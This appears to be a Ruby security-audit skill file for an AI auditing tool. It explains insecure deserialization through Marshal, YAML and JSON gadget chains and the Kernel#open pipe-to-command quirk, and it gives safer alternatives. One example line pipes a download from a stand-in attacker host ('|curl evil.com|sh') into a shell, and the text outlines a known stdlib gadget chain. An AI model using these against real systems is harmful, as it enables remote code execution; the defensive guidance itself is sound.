# Ruby-specific vulnerabilities

> - This knowledge extends your judgment. Apply what fits the project and keep reasoning beyond the list.
> - Source: the official Ruby docs (`Marshal`, `Psych`/`YAML`, `command_injection.rdoc`, the `security.rdoc` guide) and Luke Jahnke (elttam), "Ruby 2.x Universal RCE Deserialization Gadget Chain" (Nov 8, 2018).

## Rules

- This skill audits and explains.
- By default, it never rewrites your code.

## What to look for

### Insecure deserialization via `Marshal.load` (and YAML / JSON gadget chains)

Ruby's `Marshal.load` reconstructs almost any class loaded in the process, and on reconstruction it invokes the object's own `marshal_load` instance method, analogous to PHP's `__wakeup`. The official docs warn never to pass untrusted data, including user-supplied input, to this method. Luke Jahnke (elttam) published the first public _universal_ gadget chain for arbitrary command execution on Ruby 2.x: built entirely from the standard library (Ruby 2.5.3 loads 358 classes by default) and pivoting on `Gem::Requirement#marshal_load`, so no app-specific gadget classes are needed. The dangerous pattern is a single line:

```ruby
obj = Marshal.load(untrusted)   # → RCE
```

The same execution-by-design property reaches the text formats that can revive Ruby objects:

- **YAML / Psych.** `YAML.load` (on Psych ≤ 3, the historical default) and `Psych.load`/`unsafe_load` instantiate tagged Ruby objects. The universal gadget works here too, by swapping `Gem::Requirement` into the YAML payload. The docs state plainly that loading untrusted YAML can execute arbitrary code.
- **JSON.** `JSON.load` with `json/add` loaded revives typed objects from `json_class` tags. `JSON.parse` does not, so flag `JSON.load` of untrusted input, not `JSON.parse`.

A documented real-world case is GitHub Enterprise 2.8.0–2.8.6 (CVE-2017-18365, CVSS 9.8): the enterprise session secret was always the same, so a cookie signed with that secret could reach `Marshal.load` with attacker-controlled data, full RCE. The researcher was rewarded $18,000. The danger is often not an obvious upload but a trusted-looking carrier: a signed session cookie, a cache entry, a job payload, a message body. Trace the byte source to the sink, not just a literal `Marshal.load` call.

Safer shapes, applied where they fit:

- **Never `Marshal.load` untrusted data.** Use `JSON.parse` (not `JSON.load`) for data-only structures: it returns only primitive types and cannot instantiate arbitrary classes.
- For YAML use **`YAML.safe_load`** with an explicit `permitted_classes` allowlist. By default it deserializes only basic scalars, `Array`, and `Hash`, and raises `Psych::DisallowedClass` on anything else. On **Psych 4 / Ruby 3.1+**, `YAML.load` is itself an alias of `safe_load` and is safe by default; on older Rubies you must call `safe_load` explicitly (passing `permitted_classes:` for any non-basic class you genuinely expect).
- RuboCop's `Security/MarshalLoad`, `Security/YAMLLoad`, and `Security/JSONLoad` cops flag these sinks in CI. A shared or guessable signing secret around a `Marshal`/`YAML` cookie is not a fix: it only gates _who_ can reach the sink, and the sink is still a full RCE primitive if the secret leaks or a trusted producer is compromised.

### `Kernel#open` / `URI.open` pipe-to-command quirk

Ruby's `Kernel#open` treats a leading `|` in its path argument as a **command to run in a subprocess**, returning that command's output, a documented Ruby behavior. So `open("|ls")` runs `ls`. The same `|`-honoring behavior applies to `IO.read`, `IO.write`, `IO.binread`, `IO.binwrite`, `IO.readlines`, `IO.foreach`, and `URI.open` (per the official `command_injection.rdoc`). Passing user-controlled data to any of these, where the value can begin with `|`, is command injection even when no shell exec was intended:

```ruby
open(params[:path])   # path = "|curl evil.com|sh" → RCE
```

This same quirk is the _final sink_ in many Ruby deserialization gadget chains, where the chain ends by handing an attacker-built `"|cmd"` string to an `open`-style call. Note `Kernel#open`'s pipe behavior is deprecated and slated for removal in Ruby 4.0 (it now emits a deprecation warning), but it still executes on current Rubies, so a reachable one is a live finding.

Safer shape: use the explicit, non-magical APIs.

- **`File.open` / `File.read`** for files: since Ruby 2.6 these (and `File.write`, `File.binread`, `File.binwrite`, `File.foreach`, `File.readlines`) no longer honor a leading `|`, so `File.open("|cmd")` raises `Errno::ENOENT` instead of running a command.
- **`IO.popen`** only when you genuinely intend to run a command, with a fixed binary and an argument array, never a string built from input.
- **`URI.parse(url).open`** for URLs, so the value is parsed as a URI rather than a possible command.
- RuboCop `Security/Open` flags `open`/`URI.open` with dynamic input. Watch `Open3.*` methods, and any `IO.*` reader fed user data, on the same path.

## How to act on the result

- **In detect (detection):** each pattern you confirm is a finding. Describe it in plain language: what it is (the Ruby behavior being abused, a deserialization sink that revives live objects, or an `open`-family call that runs a `|`-prefixed value as a command), why it matters (the concrete impact, remote code execution via a gadget chain or command injection), and the evidence (the call and the source of its bytes or string, the function or area where it lives). Trace the source to the sink: a `Marshal.load`/`YAML.load`/`JSON.load`, or an `open`/`IO.read`/`URI.open`, whose input is attacker-influenced even through a trusted-looking cookie or cache, is the finding. It flows through detect's normal steps and is tracked like any other finding.
- **In verify (proof):** the control holds only when the unsafe path is gone or properly guarded: untrusted data parsed with `JSON.parse` instead of `Marshal.load`/`JSON.load`, YAML loaded through `YAML.safe_load` with a `permitted_classes` allowlist (or `YAML.load` on Psych 4+), and file/URL access moved to `File.open`/`URI.parse(url).open` so a leading `|` can never run a command. A shared signing secret around a `Marshal`/`YAML` cookie, or an `open` call still reachable by user input, does not close the risk. If the dangerous pattern still reaches untrusted input, record it as not closed and point back to harden.
